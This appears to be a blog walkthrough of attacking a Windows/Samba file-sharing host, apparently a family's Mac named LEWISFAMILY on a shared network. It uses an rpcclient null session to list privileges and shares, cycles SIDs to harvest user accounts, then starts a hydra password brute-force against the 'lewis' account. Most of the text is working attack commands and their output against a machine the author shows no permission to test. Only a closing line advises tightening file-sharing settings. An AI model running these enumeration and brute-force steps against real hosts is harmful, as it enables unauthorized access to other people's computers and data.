@@ -1,0 +1,263 @@
+Usage: rpcclient [OPTION...]
+-c, --command=COMMANDS Execute semicolon separated cmds
+-I, --dest-ip=IP Specify destination IP address
+
+Help options
+-?, --help Show this help message
+--usage Display brief usage message
+
+Common samba options:
+-d, --debuglevel=DEBUGLEVEL Set debug level
+-s, --configfile=CONFIGFILE Use alternative configuration file
+-l, --log-basename=LOGFILEBASE Basename for log/debug files
+-V, --version Print version
+
+Connection options:
+-O, --socket-options=SOCKETOPTIONS socket options to use
+-n, --netbiosname=NETBIOSNAME Primary netbios name
+-W, --workgroup=WORKGROUP Set the workgroup name
+-i, --scope=SCOPE Use this Netbios scope
+
+Authentication options:
+-U, --user=USERNAME Set the network username
+-N, --no-pass Don't ask for a password
+-k, --kerberos Use kerberos (active directory)
+authentication
+-A, --authentication-file=FILE Get the credentials from a file
+-S, --signing=on|off|required Set the client signing state
+-P, --machine-pass Use stored machine account password
+
+
+
+Once we are connected using a null session we get another set of options:
+
+root@sec$ rpcclient -U "" 192.168.182.36
+Password:
+timeout connecting to 192.168.182.36:445
+rpcclient $> help
+--------------- ----------------------
+SHUTDOWN
+shutdowninit Remote Shutdown (over shutdown pipe)
+shutdownabort Abort Shutdown (over shutdown pipe)
+--------------- ----------------------
+ECHO
+echoaddone Add one to a number
+echodata Echo data
+sinkdata Sink data
+sourcedata Source data
+--------------- ----------------------
+REG
+shutdown Remote Shutdown
+abortshutdown Abort Shutdown
+--------------- ----------------------
+DFS
+dfsexist Query DFS support
+dfsadd Add a DFS share
+dfsremove Remove a DFS share
+dfsgetinfo Query DFS share info
+dfsenum Enumerate dfs shares
+--------------- ----------------------
+SRVSVC
+srvinfo Server query info
+netshareenum Enumerate shares
+netfileenum Enumerate open files
+netremotetod Fetch remote time of day
+--------------- ----------------------
+NETLOGON
+logonctrl2 Logon Control 2
+getdcname Get trusted DC name
+logonctrl Logon Control
+samsync Sam Synchronisation
+samdeltas Query Sam Deltas
+samlogon Sam Logon
+change_trust_pw Change Trust Account Password
+--------------- ----------------------
+SPOOLSS
+adddriver Add a print driver
+addprinter Add a printer
+deldriver Delete a printer driver
+deldriverex Delete a printer driver with files
+enumdata Enumerate printer data
+enumdataex Enumerate printer data for a key
+enumkey Enumerate printer keys
+enumjobs Enumerate print jobs
+enumports Enumerate printer ports
+enumdrivers Enumerate installed printer drivers
+enumprinters Enumerate printers
+getdata Get print driver data
+getdataex Get printer driver data with keyname
+getdriver Get print driver information
+getdriverdir Get print driver upload directory
+getprinter Get printer info
+openprinter Open printer handle
+setdriver Set printer driver
+getprintprocdir Get print processor directory
+addform Add form
+setform Set form
+getform Get form
+deleteform Delete form
+enumforms Enumerate forms
+setprinter Set printer comment
+setprintername Set printername
+setprinterdata Set REG_SZ printer data
+rffpcnex Rffpcnex test
+--------------- ----------------------
+SAMR
+queryuser Query user info
+querygroup Query group info
+queryusergroups Query user groups
+queryuseraliases Query user aliases
+querygroupmem Query group membership
+queryaliasmem Query alias membership
+querydispinfo Query display info
+querydominfo Query domain info
+enumdomusers Enumerate domain users
+enumdomgroups Enumerate domain groups
+enumalsgroups Enumerate alias groups
+createdomuser Create domain user
+samlookupnames Look up names
+samlookuprids Look up names
+deletedomuser Delete domain user
+samquerysecobj Query SAMR security object
+getdompwinfo Retrieve domain password info
+lookupdomain Lookup Domain Name
+--------------- ----------------------
+LSARPC-DS
+dsroledominfo Get Primary Domain Information
+dsenumdomtrusts Enumerate all trusted domains in an AD forest
+--------------- ----------------------
+LSARPC
+lsaquery Query info policy
+lookupsids Convert SIDs to names
+lookupnames Convert names to SIDs
+enumtrust Enumerate trusted domains
+enumprivs Enumerate privileges
+getdispname Get the privilege name
+lsaenumsid Enumerate the LSA SIDS
+lsaenumprivsaccount Enumerate the privileges of an SID
+lsaenumacctrights Enumerate the rights of an SID
+lsaaddacctrights Add rights to an account
+lsaremoveacctrights Remove rights from an account
+lsalookupprivvalue Get a privilege value given its name
+lsaquerysecobj Query LSA security object
+--------------- ----------------------
+GENERAL OPTIONS
+help Get help on commands
+? Get help on commands
+debuglevel Set debug level
+list List available commands on
+exit Exit program
+quit Exit program
+sign Force RPC pipe connections to be signed
+seal Force RPC pipe connections to be sealed
+schannel Force RPC pipe connections to be sealed with 'schannel' (NETSEC). Assumes valid machine account to this domain controller.
+schannelsign Force RPC pipe connections to be signed (not sealed) with 'schannel' (NETSEC). Assumes valid machine account to this domain controller.
+none Force RPC pipe connections to have no special properties
+
+Lets play with a few options:
+
+rpcclient $> enumprivs
+found 5 privileges
+
+SeMachineAccountPrivilege 0:6 (0x0:0x6)
+SeSecurityPrivilege 0:8 (0x0:0x8)
+SeTakeOwnershipPrivilege 0:9 (0x0:0x9)
+SaAddUsers 0:65281 (0x0:0xff01)
+SaPrintOp 0:65283 (0x0:0xff03)
+
+Enumerating shares:
+
+rpcclient $> netshareenum
+netname: IPC$
+remark: IPC Service (Mac OS X)
+path: C:\tmp
+password:
+netname: ADMIN$
+remark: IPC Service (Mac OS X)
+path: C:\tmp
+password:
+netname: PSC 2170 Series
+remark: PSC 2170 Series
+path: C:\tmp
+password:
+
+Samba/OS info:
+
+rpcclient $> srvinfo
+LEWISFAMILY Wk Sv PrQ Unx NT SNT Mac OS X
+platform_id : 500
+os version : 4.9
+server type : 0x9a03
+
+Using "lookupnames" we can get the SID. Once we have "a" SID we can enumerate the rest.
+
+rpcclient $> lookupnames root
+root S-1-5-21-1835020781-2383529660-3657267081-1000 (User: 1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-500
+S-1-5-21-1835020781-2383529660-3657267081-500 LEWISFAMILY\Administrator (1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-501
+S-1-5-21-1835020781-2383529660-3657267081-501 LEWISFAMILY\unknown (1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-502
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1001
+S-1-5-21-1835020781-2383529660-3657267081-1001 LEWISFAMILY\wheel (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1000
+S-1-5-21-1835020781-2383529660-3657267081-1000 LEWISFAMILY\root (1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1002
+S-1-5-21-1835020781-2383529660-3657267081-1002 LEWISFAMILY\daemon (1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1003
+S-1-5-21-1835020781-2383529660-3657267081-1003 LEWISFAMILY\daemon (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1004
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupnames guest
+guest S-1-5-21-1835020781-2383529660-3657267081-1063 (Local Group: 4)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1005
+S-1-5-21-1835020781-2383529660-3657267081-1005 LEWISFAMILY\kmem (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1004
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1006
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1007
+S-1-5-21-1835020781-2383529660-3657267081-1007 LEWISFAMILY\sys (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1008
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1009
+S-1-5-21-1835020781-2383529660-3657267081-1009 LEWISFAMILY\tty (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1010
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1011
+S-1-5-21-1835020781-2383529660-3657267081-1011 LEWISFAMILY\operator (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1012
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1013
+S-1-5-21-1835020781-2383529660-3657267081-1013 LEWISFAMILY\mail (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1014
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-1015
+S-1-5-21-1835020781-2383529660-3657267081-1015 LEWISFAMILY\bin (2)
+rpcclient $> lookupnames lewis
+lewis S-1-5-21-1835020781-2383529660-3657267081-2002 (User: 1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-2000
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-2001
+result was NT_STATUS_NONE_MAPPED
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-2002
+S-1-5-21-1835020781-2383529660-3657267081-2002 LEWISFAMILY\user (1)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-2003
+S-1-5-21-1835020781-2383529660-3657267081-2003 LEWISFAMILY\user (2)
+rpcclient $> lookupsids S-1-5-21-1835020781-2383529660-3657267081-2004
+result was NT_STATUS_NONE_MAPPED
+
+now that i have some user accounts...
+
+root@sec$ hydra -l lewis -P common-passwords.txt 192.168.182.36 smb -V
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+WARNING: Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+Hydra v5.1 (c) 2005 by van Hauser / THC - use allowed only for legal purposes.
+Hydra (http://www.thc.org) starting at 2007-07-27 21:51:46
+[DATA] 1 tasks, 1 servers, 816 login tries (l:1/p:816), ~816 tries per task
+[DATA] attacking service smb on port 139
+[STATUS] 29.00 tries/min, 29 tries in 00:01h, 787 todo in 00:28h
+...
+
+yet another reason to adjust your file & printer sharing configurations when you take your computer on the road (especially if you share your My Documents folder)
